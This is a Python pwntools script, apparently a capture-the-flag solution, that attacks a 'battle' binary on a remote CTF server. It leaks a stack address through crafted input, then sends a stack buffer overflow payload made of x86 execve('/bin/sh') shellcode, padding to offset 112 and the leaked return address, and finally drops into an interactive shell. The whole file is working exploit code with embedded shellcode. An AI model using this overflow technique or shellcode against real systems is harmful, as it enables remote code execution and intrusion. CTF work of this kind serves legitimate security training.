from pwn import *

#r = process('./battle')
r = remote('ctf.pragyan.org', 12500)

for i in range(8):
  r.recvuntil('/8')
  r.sendline('A ')

r.recvuntil('/8')
r.sendline('A \x65\x64\x64\x64\xff')
r.recvuntil('F')
r.sendline('F')
r.recvuntil('leaderboard:')
r.sendline('WinnersOnlyAllowed')
leak = int(r.recvline().strip().split(' ')[-1],16)
log.info('Stack leak: {}'.format(hex(leak)))

r.sendline('F')
r.recvuntil('leaderboard:')

log.info('Sending payload')
# shellcode
shellcode =  '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

# offset 112
payload = ""
payload += shellcode 
payload += 'A'*(112-len(shellcode))
payload += p32(leak)
r.sendline(payload)
r.recvuntil('\n')

log.info('Enjoy your shell! >_<')

r.interactive()
